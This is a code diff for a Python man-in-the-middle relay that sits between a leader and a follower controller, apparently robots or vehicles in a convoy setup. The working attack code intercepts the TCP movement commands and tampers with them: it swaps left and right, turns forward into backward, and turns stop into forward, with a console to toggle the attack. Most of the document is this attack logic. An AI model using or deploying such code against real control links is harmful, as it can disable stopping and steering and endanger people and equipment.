@@ -2,9 +2,31 @@ import socket
 import threading
 import time
 
-# Global variables
-attack_enabled = True  # Attack starts enabled
-toggle_lock = threading.Lock()  # For thread safety when toggling
+# Global variables for attack toggle
+toggle_lock = threading.Lock()
+attack_enabled = True  # Starts enabled
+
+def manipulate_direction(key):
+    """
+    Manipulate only the direction command sent from leader to follower.
+    Speed remains unchanged.
+    """
+    # Example 1: Reverse directions
+    if key == 'a':
+        return 'd'  # Change left to right
+    elif key == 'd':
+        return 'a'  # Change right to left
+    
+    # Example 2: Delay certain commands (forward becomes backwards)
+    if key == 'w':
+        return 's'  # Replace forward with backward
+    
+    # Example 3: Block stopping
+    if key == 'f':
+        return 'w'  # Replace stop with forward
+    
+    # Default: Pass through unchanged
+    return key
 
 def handle_leader_to_follower(leader_conn, follower_conn):
     try:
@@ -14,60 +36,34 @@ def handle_leader_to_follower(leader_conn, follower_conn):
                 print("Leader disconnected")
                 break
             
-            original_data = data.decode('utf-8')
-            print(f"Original data: {original_data}")
+            original = data.decode('utf-8')
+            print(f"Original data: {original}")
             
-            # Get current attack state in thread-safe manner
+            # Check attack state thread-safely
             with toggle_lock:
-                currently_enabled = attack_enabled
+                enabled = attack_enabled
             
-            # Parse the data
-            try:
-                leader_speed, key = original_data.split(',')
-                
-                if currently_enabled:
-                    # Manipulate the direction key only when attack is enabled
-                    manipulated_key = manipulate_direction(key)
-                    modified_data = f"{leader_speed},{manipulated_key}"
-                    print(f"Leader → Follower: {original_data} → {modified_data}")
-                    follower_conn.sendall(modified_data.encode('utf-8'))
-                else:
-                    # Pass through unmodified when attack is disabled
-                    print(f"Leader → Follower: {original_data} (passing through)")
+            if enabled:
+                try:
+                    speed, key = original.split(',')
+                    new_key = manipulate_direction(key)
+                    modified = f"{speed},{new_key}"
+                    print(f"Modified data: {original} -> {modified}")
+                    follower_conn.sendall(modified.encode('utf-8'))
+                except Exception as e:
+                    print(f"Error processing data: {e}")
                     follower_conn.sendall(data)
-            except Exception as e:
-                print(f"Error processing data: {e}")
-                # Forward original data if parsing fails
+            else:
+                print(f"Passing through: {original}")
                 follower_conn.sendall(data)
     except Exception as e:
         print(f"Leader-to-follower error: {e}")
+    finally:
+        leader_conn.close()
+        follower_conn.close()
 
-def manipulate_direction(key):
-    """
-    Manipulate only the direction command sent from leader to follower.
-    Speed remains unchanged.
-    """
-    # === EXAMPLES OF DIRECTION MANIPULATION ===
-    
-    # Example 1: Reverse directions
-    if key == 'a':
-        return 'd'  # Change left to right
-    elif key == 'd':
-        return 'a'  # Change right to left
-    
-    # Example 2: Delay certain commands
-    if key == 'w':
-        return 's'  # Add a 5-second delay to forward movement
-    
-    # Example 3: Block stopping
-    if key == 'f':
-        return 'w'  # Replace stop with forward
-    
-    # Default: Pass through unchanged
-    return key
 
 def toggle_attack():
-    """Toggle the attack state on/off"""
     global attack_enabled
     with toggle_lock:
         attack_enabled = not attack_enabled
@@ -75,67 +71,68 @@ def toggle_attack():
         print(f"\n[!] Attack mode {status}")
 
 def handle_commands():
-    """Simple command handler for toggling attack"""
-    global attack_enabled
-    
-    print("\n=== MITM ATTACK CONTROL ===")
-    print("Type 'toggle' to turn attack on/off")
-    print("Type 'status' to show current status")
-    print("Type 'exit' to quit")
+    print("\n=== ATTACK CONTROL ===")
+    print("Type 'toggle' to enable/disable attack")
+    print("Type 'status' to show current mode")
+    print("Type 'exit' to terminate")
     
     while True:
-        command = input("\nCommand> ").strip().lower()
-        
-        if command == "toggle":
+        cmd = input("Command> ").strip().lower()
+        if cmd == 'toggle':
             toggle_attack()
-        elif command == "status":
-            status = "ENABLED" if attack_enabled else "DISABLED"
-            print(f"Attack is currently {status}")
-        elif command == "exit":
-            print("Exiting...")
+        elif cmd == 'status':
+            with toggle_lock:
+                st = "ENABLED" if attack_enabled else "DISABLED"
+            print(f"Attack is currently {st}")
+        elif cmd == 'exit':
+            print("Exiting control interface...")
             break
         else:
-            print("Unknown command. Use 'toggle', 'status', or 'exit'")
+            print("Unknown command. Use 'toggle', 'status', or 'exit'.")
 
-def start_mitm():
-    # Connect to the leader
-    leader_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    print("MITM connecting to leader...")
-    try:
-        leader_socket.connect(('192.168.1.30', 12345))  # Connect to leader's IP
-        print("Connected to leader")
-    except Exception as e:
-        print(f"Failed to connect to leader: {e}")
-        return
-    
-    # Accept connection from the follower
+
+def start_relay():
+    # Leader socket
+    leader_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    leader_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    leader_server.bind(('0.0.0.0', 12345))
+    leader_server.listen(1)
+    print("Relay waiting for leader connection on port 12345...")
+    leader_conn, leader_addr = leader_server.accept()
+    print(f"Leader connected from {leader_addr}")
+
+    # Follower socket
     follower_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    follower_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     follower_server.bind(('0.0.0.0', 12346))
     follower_server.listen(1)
-    print("MITM waiting for follower connection...")
-    
+    print("Relay waiting for follower connection on port 12346...")
     follower_conn, follower_addr = follower_server.accept()
     print(f"Follower connected from {follower_addr}")
-    
-    print("\n=== MITM ATTACK ACTIVE ===")
-    print("Currently manipulating: Direction commands only")
-    print("Active manipulations:")
-    print("- Left/Right directions reversed")
-    print("- Forward movement delayed by 5 seconds")
-    print("- Stop commands replaced with forward")
-    
-    # Start thread to handle communication from leader to follower
-    threading.Thread(target=handle_leader_to_follower, 
-                     args=(leader_socket, follower_conn), 
-                     daemon=True).start()
-    
-    # Start command interface on main thread
-    handle_commands()
-    
-    # Clean up before exit
-    print("Closing connections...")
-    leader_socket.close()
-    follower_conn.close()
 
-if __name__ == "__main__":
-    start_mitm()
+    print("\n=== RELAY ACTIVE ===")
+    print("Attack manipulation is initially ENABLED")
+
+    # Start the command interface in its own thread
+    threading.Thread(target=handle_commands, daemon=True).start()
+
+    # Start the relay/mitm thread
+    threading.Thread(
+        target=handle_leader_to_follower,
+        args=(leader_conn, follower_conn),
+        daemon=True
+    ).start()
+
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\nShutting down relay and control interface...")
+    finally:
+        leader_conn.close()
+        follower_conn.close()
+        leader_server.close()
+        follower_server.close()
+
+if __name__ == '__main__':
+    start_relay()
